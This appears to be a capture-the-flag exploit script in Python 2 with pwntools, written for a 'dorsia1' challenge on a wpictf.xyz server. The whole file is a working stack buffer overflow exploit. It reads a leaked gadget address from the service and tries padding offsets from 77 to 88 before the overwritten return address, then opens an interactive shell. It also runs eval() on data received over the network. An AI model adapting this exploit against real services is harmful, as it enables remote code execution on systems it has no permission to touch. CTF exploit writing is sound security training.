#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

# rop1
for i in range(8,20):
    p = remote('dorsia1.wpictf.xyz',31338)
    og = eval(p.recv(14))
    print 'og',hex(og)
    p.recv()
    offset = 69+i
    payload = 'A'*offset
    payload += p64(og)
    print "[+] ",i
    print payload
    p.sendline(payload)
    p.interactive()
